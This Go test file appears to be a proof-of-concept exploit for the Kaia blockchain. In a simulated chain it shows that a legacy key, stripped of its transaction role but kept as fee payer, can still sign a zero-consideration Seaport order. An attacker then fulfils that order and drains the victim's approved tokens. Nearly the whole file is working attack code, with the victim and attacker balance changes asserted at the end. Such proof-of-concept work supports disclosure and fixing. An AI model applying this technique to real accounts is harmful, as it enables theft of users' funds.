package backends

import (
    "context"
    "crypto/ecdsa"
    "fmt"
    "math/big"
    "os"
    "strings"
    "testing"

    "github.com/kaiachain/kaia"
    "github.com/kaiachain/kaia/accounts/abi"
    "github.com/kaiachain/kaia/blockchain"
    "github.com/kaiachain/kaia/blockchain/types"
    "github.com/kaiachain/kaia/blockchain/types/accountkey"
    "github.com/kaiachain/kaia/common"
    "github.com/kaiachain/kaia/crypto"
    "github.com/kaiachain/kaia/params"
)

const seaportABIJSON = `[
  {"type":"function","name":"information","stateMutability":"view","inputs":[],"outputs":[{"name":"version","type":"string"},{"name":"domainSeparator","type":"bytes32"},{"name":"conduitController","type":"address"}]},
  {"type":"function","name":"getCounter","stateMutability":"view","inputs":[{"name":"offerer","type":"address"}],"outputs":[{"name":"counter","type":"uint256"}]},
  {"type":"function","name":"getOrderHash","stateMutability":"view","inputs":[{"name":"order","type":"tuple","components":[{"name":"offerer","type":"address"},{"name":"zone","type":"address"},{"name":"offer","type":"tuple[]","components":[{"name":"itemType","type":"uint8"},{"name":"token","type":"address"},{"name":"identifierOrCriteria","type":"uint256"},{"name":"startAmount","type":"uint256"},{"name":"endAmount","type":"uint256"}]},{"name":"consideration","type":"tuple[]","components":[{"name":"itemType","type":"uint8"},{"name":"token","type":"address"},{"name":"identifierOrCriteria","type":"uint256"},{"name":"startAmount","type":"uint256"},{"name":"endAmount","type":"uint256"},{"name":"recipient","type":"address"}]},{"name":"orderType","type":"uint8"},{"name":"startTime","type":"uint256"},{"name":"endTime","type":"uint256"},{"name":"zoneHash","type":"bytes32"},{"name":"salt","type":"uint256"},{"name":"conduitKey","type":"bytes32"},{"name":"counter","type":"uint256"}]}],"outputs":[{"name":"orderHash","type":"bytes32"}]},
  {"type":"function","name":"fulfillOrder","stateMutability":"payable","inputs":[{"name":"order","type":"tuple","components":[{"name":"parameters","type":"tuple","components":[{"name":"offerer","type":"address"},{"name":"zone","type":"address"},{"name":"offer","type":"tuple[]","components":[{"name":"itemType","type":"uint8"},{"name":"token","type":"address"},{"name":"identifierOrCriteria","type":"uint256"},{"name":"startAmount","type":"uint256"},{"name":"endAmount","type":"uint256"}]},{"name":"consideration","type":"tuple[]","components":[{"name":"itemType","type":"uint8"},{"name":"token","type":"address"},{"name":"identifierOrCriteria","type":"uint256"},{"name":"startAmount","type":"uint256"},{"name":"endAmount","type":"uint256"},{"name":"recipient","type":"address"}]},{"name":"orderType","type":"uint8"},{"name":"startTime","type":"uint256"},{"name":"endTime","type":"uint256"},{"name":"zoneHash","type":"bytes32"},{"name":"salt","type":"uint256"},{"name":"conduitKey","type":"bytes32"},{"name":"totalOriginalConsiderationItems","type":"uint256"}]},{"name":"signature","type":"bytes"}]},{"name":"fulfillerConduitKey","type":"bytes32"}],"outputs":[{"name":"fulfilled","type":"bool"}]},
  {"type":"function","name":"getOrderStatus","stateMutability":"view","inputs":[{"name":"orderHash","type":"bytes32"}],"outputs":[{"name":"isValidated","type":"bool"},{"name":"isCancelled","type":"bool"},{"name":"totalFilled","type":"uint256"},{"name":"totalSize","type":"uint256"}]}
]`

const erc20ABIJSON = `[
  {"type":"function","name":"mint","stateMutability":"nonpayable","inputs":[{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"outputs":[]},
  {"type":"function","name":"approve","stateMutability":"nonpayable","inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"outputs":[{"name":"ok","type":"bool"}]},
  {"type":"function","name":"balanceOf","stateMutability":"view","inputs":[{"name":"owner","type":"address"}],"outputs":[{"name":"balance","type":"uint256"}]},
  {"type":"function","name":"allowance","stateMutability":"view","inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"outputs":[{"name":"allowance","type":"uint256"}]}
]`

type integrationOfferItem struct {
    ItemType             uint8
    Token                common.Address
    IdentifierOrCriteria *big.Int
    StartAmount          *big.Int
    EndAmount            *big.Int
}

type integrationConsiderationItem struct {
    ItemType             uint8
    Token                common.Address
    IdentifierOrCriteria *big.Int
    StartAmount          *big.Int
    EndAmount            *big.Int
    Recipient            common.Address
}

type integrationOrderComponents struct {
    Offerer       common.Address
    Zone          common.Address
    Offer         []integrationOfferItem
    Consideration []integrationConsiderationItem
    OrderType     uint8
    StartTime     *big.Int
    EndTime       *big.Int
    ZoneHash      [32]byte
    Salt          *big.Int
    ConduitKey    [32]byte
    Counter       *big.Int
}

type integrationOrderParameters struct {
    Offerer                         common.Address
    Zone                            common.Address
    Offer                           []integrationOfferItem
    Consideration                   []integrationConsiderationItem
    OrderType                       uint8
    StartTime                       *big.Int
    EndTime                         *big.Int
    ZoneHash                        [32]byte
    Salt                            *big.Int
    ConduitKey                      [32]byte
    TotalOriginalConsiderationItems *big.Int
}

type integrationOrder struct {
    Parameters integrationOrderParameters
    Signature  []byte
}

func integrationReadHex(t *testing.T, path string) []byte {
    t.Helper()
    raw, err := os.ReadFile(path)
    if err != nil {
        t.Fatalf("read %s: %v", path, err)
    }
    out := common.FromHex(strings.TrimSpace(string(raw)))
    if len(out) == 0 {
        t.Fatalf("empty bytecode at %s", path)
    }
    return out
}

func integrationKey(t *testing.T, raw string) *ecdsa.PrivateKey {
    t.Helper()
    key, err := crypto.HexToECDSA(raw)
    if err != nil {
        t.Fatalf("HexToECDSA: %v", err)
    }
    return key
}

func integrationPack(t *testing.T, contractABI abi.ABI, method string, args ...interface{}) []byte {
    t.Helper()
    data, err := contractABI.Pack(method, args...)
    if err != nil {
        t.Fatalf("pack %s: %v", method, err)
    }
    return data
}

func integrationCall(
    t *testing.T,
    backend *SimulatedBackend,
    from common.Address,
    to common.Address,
    data []byte,
) []byte {
    t.Helper()
    ret, err := backend.CallContract(context.Background(), kaia.CallMsg{
        From: from,
        To:   &to,
        Gas:  30_000_000,
        Data: data,
    }, nil)
    if err != nil {
        t.Fatalf("call %s: %v", to.Hex(), err)
    }
    return ret
}

func integrationExecutionTx(
    t *testing.T,
    signer types.Signer,
    key *ecdsa.PrivateKey,
    from common.Address,
    nonce uint64,
    to common.Address,
    data []byte,
) *types.Transaction {
    t.Helper()
    tx, err := types.NewTransactionWithMap(types.TxTypeSmartContractExecution, map[types.TxValueKeyType]interface{}{
        types.TxValueKeyNonce:    nonce,
        types.TxValueKeyGasPrice: big.NewInt(1),
        types.TxValueKeyGasLimit: uint64(30_000_000),
        types.TxValueKeyFrom:     from,
        types.TxValueKeyAmount:   big.NewInt(0),
        types.TxValueKeyTo:       to,
        types.TxValueKeyData:     data,
    })
    if err != nil {
        t.Fatalf("new execution tx: %v", err)
    }
    if err := tx.SignWithKeys(signer, []*ecdsa.PrivateKey{key}); err != nil {
        t.Fatalf("sign execution tx: %v", err)
    }
    return tx
}

func integrationSend(
    t *testing.T,
    backend *SimulatedBackend,
    tx *types.Transaction,
) *types.Receipt {
    t.Helper()
    if err := backend.SendTransaction(context.Background(), tx); err != nil {
        t.Fatalf("send transaction %s: %v", tx.Hash().Hex(), err)
    }
    backend.Commit()
    receipt, err := backend.TransactionReceipt(context.Background(), tx.Hash())
    if err != nil {
        t.Fatalf("receipt %s: %v", tx.Hash().Hex(), err)
    }
    if receipt == nil {
        t.Fatalf("nil receipt %s", tx.Hash().Hex())
    }
    if receipt.Status != types.ReceiptStatusSuccessful {
        t.Fatalf("transaction %s failed status=%d", tx.Hash().Hex(), receipt.Status)
    }
    return receipt
}

func integrationUint256(t *testing.T, contractABI abi.ABI, method string, ret []byte) *big.Int {
    t.Helper()
    values, err := contractABI.Unpack(method, ret)
    if err != nil || len(values) != 1 {
        t.Fatalf("unpack %s: values=%d err=%v", method, len(values), err)
    }
    value, ok := values[0].(*big.Int)
    if !ok {
        t.Fatalf("unexpected %s type %T", method, values[0])
    }
    return value
}

func TestSeaportRoleCollapseSingleState(t *testing.T) {
    seaportRuntime := integrationReadHex(t, os.Getenv("SEAPORT_RUNTIME_FILE"))
    tokenRuntime := integrationReadHex(t, os.Getenv("TOKEN_RUNTIME_FILE"))

    feeKey := integrationKey(t, "00000000000000000000000000000000000000000000000000000000000a11ce")
    updateKey := integrationKey(t, "00000000000000000000000000000000000000000000000000000000000c0ffe")
    attackerKey := integrationKey(t, "000000000000000000000000000000000000000000000000000000000badca11")
    victim := crypto.PubkeyToAddress(feeKey.PublicKey)
    attacker := crypto.PubkeyToAddress(attackerKey.PublicKey)

    seaport := common.HexToAddress("0x0000000000000068F116a894984e2DB1123eB395")
    token := common.HexToAddress("0x1000000000000000000000000000000000000001")
    sink := common.HexToAddress("0x000000000000000000000000000000000000bEEF")
    guardSlot := common.HexToHash("0x929eee14")
    guardValue := common.HexToHash(os.Getenv("SEAPORT_GUARD_VALUE"))

    balance := new(big.Int).Exp(big.NewInt(10), big.NewInt(30), nil)
    alloc := blockchain.GenesisAlloc{
        victim:   {Balance: new(big.Int).Set(balance)},
        attacker: {Balance: new(big.Int).Set(balance)},
        sink:     {Balance: big.NewInt(0)},
        seaport: {
            Balance: big.NewInt(0),
            Code:    seaportRuntime,
            Storage: map[common.Hash]common.Hash{guardSlot: guardValue},
        },
        token: {Balance: big.NewInt(0), Code: tokenRuntime},
    }

    cfg := params.TestKaiaConfig("cancun")
    cfg.ChainID = big.NewInt(8217)
    backend := NewSimulatedBackendWithChainConfig(alloc, cfg)
    defer backend.Close()

    seaportABI, err := abi.JSON(strings.NewReader(seaportABIJSON))
    if err != nil {
        t.Fatalf("seaport ABI: %v", err)
    }
    tokenABI, err := abi.JSON(strings.NewReader(erc20ABIJSON))
    if err != nil {
        t.Fatalf("token ABI: %v", err)
    }
    signer := types.LatestSignerForChainID(cfg.ChainID)
    amount := new(big.Int).Mul(big.NewInt(100), new(big.Int).Exp(big.NewInt(10), big.NewInt(18), nil))

    // Controlled setup: attacker mints, then the legacy account grants a normal
    // standing approval before installing the restrictive role-based key.
    mintTx := integrationExecutionTx(t, signer, attackerKey, attacker, 0, token,
        integrationPack(t, tokenABI, "mint", victim, amount))
    integrationSend(t, backend, mintTx)

    approveTx := integrationExecutionTx(t, signer, feeKey, victim, 0, token,
        integrationPack(t, tokenABI, "approve", seaport, new(big.Int).Sub(new(big.Int).Lsh(big.NewInt(1), 256), big.NewInt(1))))
    integrationSend(t, backend, approveTx)

    allowance := integrationUint256(t, tokenABI, "allowance", integrationCall(
        t, backend, attacker, token, integrationPack(t, tokenABI, "allowance", victim, seaport),
    ))
    if allowance.Cmp(amount) < 0 {
        t.Fatalf("standing approval missing: %s", allowance)
    }

    // Install the exact role separation at the protocol layer.
    roleKey := accountkey.NewAccountKeyRoleBasedWithValues([]accountkey.AccountKey{
        accountkey.NewAccountKeyFail(),
        accountkey.NewAccountKeyPublicWithValue(&updateKey.PublicKey),
        accountkey.NewAccountKeyLegacy(),
    })
    updateTx, err := types.NewTransactionWithMap(types.TxTypeAccountUpdate, map[types.TxValueKeyType]interface{}{
        types.TxValueKeyNonce:      uint64(1),
        types.TxValueKeyFrom:       victim,
        types.TxValueKeyGasPrice:   big.NewInt(1),
        types.TxValueKeyGasLimit:   uint64(5_000_000),
        types.TxValueKeyAccountKey: roleKey,
    })
    if err != nil {
        t.Fatalf("new account update: %v", err)
    }
    if err := updateTx.SignWithKeys(signer, []*ecdsa.PrivateKey{feeKey}); err != nil {
        t.Fatalf("sign account update: %v", err)
    }
    integrationSend(t, backend, updateTx)

    stateDB, err := backend.blockchain.State()
    if err != nil {
        t.Fatalf("state after account update: %v", err)
    }
    installed := stateDB.GetKey(victim)
    blockNumber := backend.blockchain.CurrentBlock().NumberU64()
    if err := accountkey.ValidateAccountKey(blockNumber, victim, installed, []*ecdsa.PublicKey{&feeKey.PublicKey}, accountkey.RoleTransaction); err == nil {
        t.Fatal("K0 unexpectedly retained RoleTransaction")
    }
    if err := accountkey.ValidateAccountKey(blockNumber, victim, installed, []*ecdsa.PublicKey{&feeKey.PublicKey}, accountkey.RoleAccountUpdate); err == nil {
        t.Fatal("K0 unexpectedly retained RoleAccountUpdate")
    }
    if err := accountkey.ValidateAccountKey(blockNumber, victim, installed, []*ecdsa.PublicKey{&feeKey.PublicKey}, accountkey.RoleFeePayer); err != nil {
        t.Fatalf("K0 did not retain RoleFeePayer: %v", err)
    }

    // A native transaction signed by K0 is rejected by the same current state.
    forbiddenTx := integrationExecutionTx(t, signer, feeKey, victim, 2, token,
        integrationPack(t, tokenABI, "approve", sink, big.NewInt(1)))
    currentSigner := types.MakeSigner(cfg, backend.blockchain.CurrentBlock().Number())
    if _, err := forbiddenTx.AsMessageWithAccountKeyPicker(currentSigner, stateDB, blockNumber); err == nil {
        t.Fatal("K0 unexpectedly authorized a native transaction")
    }

    // The same K0 is accepted as a fee payer in an actual Kaia transaction.
    feeTx, err := types.NewTransactionWithMap(types.TxTypeFeeDelegatedValueTransfer, map[types.TxValueKeyType]interface{}{
        types.TxValueKeyNonce:    uint64(1),
        types.TxValueKeyFrom:     attacker,
        types.TxValueKeyFeePayer: victim,
        types.TxValueKeyGasPrice: big.NewInt(1),
        types.TxValueKeyGasLimit: uint64(100_000),
        types.TxValueKeyTo:       sink,
        types.TxValueKeyAmount:   big.NewInt(0),
    })
    if err != nil {
        t.Fatalf("new fee delegated tx: %v", err)
    }
    if err := feeTx.SignWithKeys(signer, []*ecdsa.PrivateKey{attackerKey}); err != nil {
        t.Fatalf("sign fee delegated sender: %v", err)
    }
    if err := feeTx.SignFeePayerWithKeys(signer, []*ecdsa.PrivateKey{feeKey}); err != nil {
        t.Fatalf("sign fee payer: %v", err)
    }
    integrationSend(t, backend, feeTx)

    // Build a fresh zero-consideration order after the restrictive AccountKey
    // is active. The attacker chooses the asset, amount and recipient.
    counterRet := integrationCall(t, backend, attacker, seaport,
        integrationPack(t, seaportABI, "getCounter", victim))
    counter := integrationUint256(t, seaportABI, "getCounter", counterRet)
    offer := []integrationOfferItem{{
        ItemType:             1,
        Token:                token,
        IdentifierOrCriteria: big.NewInt(0),
        StartAmount:          new(big.Int).Set(amount),
        EndAmount:            new(big.Int).Set(amount),
    }}
    components := integrationOrderComponents{
        Offerer:       victim,
        Zone:          common.Address{},
        Offer:         offer,
        Consideration: []integrationConsiderationItem{},
        OrderType:     0,
        StartTime:     big.NewInt(0),
        EndTime:       new(big.Int).Sub(new(big.Int).Lsh(big.NewInt(1), 256), big.NewInt(1)),
        ZoneHash:      [32]byte{},
        Salt:          big.NewInt(0xFEE0),
        ConduitKey:    [32]byte{},
        Counter:       counter,
    }
    hashRet := integrationCall(t, backend, attacker, seaport,
        integrationPack(t, seaportABI, "getOrderHash", components))
    hashValues, err := seaportABI.Unpack("getOrderHash", hashRet)
    if err != nil || len(hashValues) != 1 {
        t.Fatalf("unpack order hash: values=%d err=%v", len(hashValues), err)
    }
    orderHash, ok := hashValues[0].([32]byte)
    if !ok {
        t.Fatalf("unexpected order hash type %T", hashValues[0])
    }

    infoRet := integrationCall(t, backend, attacker, seaport,
        integrationPack(t, seaportABI, "information"))
    infoValues, err := seaportABI.Unpack("information", infoRet)
    if err != nil || len(infoValues) != 3 {
        t.Fatalf("unpack information: values=%d err=%v", len(infoValues), err)
    }
    if infoValues[0].(string) != "1.6" {
        t.Fatalf("wrong Seaport version %q", infoValues[0].(string))
    }
    domainSeparator, ok := infoValues[1].([32]byte)
    if !ok {
        t.Fatalf("unexpected domain separator type %T", infoValues[1])
    }
    digest := crypto.Keccak256Hash(
        []byte{0x19, 0x01}, domainSeparator[:], orderHash[:],
    )
    signature, err := crypto.Sign(digest[:], feeKey)
    if err != nil {
        t.Fatalf("sign Seaport order: %v", err)
    }
    if signature[64] < 27 {
        signature[64] += 27
    }

    order := integrationOrder{
        Parameters: integrationOrderParameters{
            Offerer:                         victim,
            Zone:                            common.Address{},
            Offer:                           offer,
            Consideration:                   []integrationConsiderationItem{},
            OrderType:                       0,
            StartTime:                       components.StartTime,
            EndTime:                         components.EndTime,
            ZoneHash:                        [32]byte{},
            Salt:                            components.Salt,
            ConduitKey:                      [32]byte{},
            TotalOriginalConsiderationItems: big.NewInt(0),
        },
        Signature: signature,
    }

    victimBefore := integrationUint256(t, tokenABI, "balanceOf", integrationCall(
        t, backend, attacker, token, integrationPack(t, tokenABI, "balanceOf", victim),
    ))
    attackerBefore := integrationUint256(t, tokenABI, "balanceOf", integrationCall(
        t, backend, attacker, token, integrationPack(t, tokenABI, "balanceOf", attacker),
    ))

    exploitData := integrationPack(t, seaportABI, "fulfillOrder", order, [32]byte{})
    exploitTx := integrationExecutionTx(t, signer, attackerKey, attacker, 2, seaport, exploitData)
    receipt := integrationSend(t, backend, exploitTx)

    victimAfter := integrationUint256(t, tokenABI, "balanceOf", integrationCall(
        t, backend, attacker, token, integrationPack(t, tokenABI, "balanceOf", victim),
    ))
    attackerAfter := integrationUint256(t, tokenABI, "balanceOf", integrationCall(
        t, backend, attacker, token, integrationPack(t, tokenABI, "balanceOf", attacker),
    ))
    if victimBefore.Cmp(amount) != 0 || victimAfter.Sign() != 0 {
        t.Fatalf("victim balance delta wrong: %s -> %s", victimBefore, victimAfter)
    }
    if new(big.Int).Sub(attackerAfter, attackerBefore).Cmp(amount) != 0 {
        t.Fatalf("attacker delta wrong: %s -> %s", attackerBefore, attackerAfter)
    }

    statusRet := integrationCall(t, backend, attacker, seaport,
        integrationPack(t, seaportABI, "getOrderStatus", orderHash))
    statusValues, err := seaportABI.Unpack("getOrderStatus", statusRet)
    if err != nil || len(statusValues) != 4 {
        t.Fatalf("unpack order status: values=%d err=%v", len(statusValues), err)
    }
    if !statusValues[0].(bool) || statusValues[1].(bool) {
        t.Fatalf("bad validation/cancellation state: %v", statusValues)
    }
    if statusValues[2].(*big.Int).Cmp(big.NewInt(1)) != 0 || statusValues[3].(*big.Int).Cmp(big.NewInt(1)) != 0 {
        t.Fatalf("bad fill state: %v", statusValues)
    }

    finalState, err := backend.blockchain.State()
    if err != nil {
        t.Fatalf("final state: %v", err)
    }
    if finalState.GetNonce(victim) != 2 {
        t.Fatalf("victim submitted an unexpected post-update transaction: nonce=%d", finalState.GetNonce(victim))
    }

    t.Logf("KAIA_SINGLE_STATE_ROLE_COLLAPSE victim=%s attacker=%s seaport=%s codehash=%s orderHash=%s digest=%s victimToken=%s->%s attackerToken=%s->%s exploitTx=%s gasUsed=%d",
        victim.Hex(), attacker.Hex(), seaport.Hex(), crypto.Keccak256Hash(seaportRuntime).Hex(), common.BytesToHash(orderHash[:]).Hex(), digest.Hex(), victimBefore.String(), victimAfter.String(), attackerBefore.String(), attackerAfter.String(), exploitTx.Hash().Hex(), receipt.GasUsed)
    t.Log("KAIA_SINGLE_STATE_ROLE_COLLAPSE_PROVEN")
    fmt.Println("KAIA_SINGLE_STATE_ROLE_COLLAPSE_PROVEN")
}
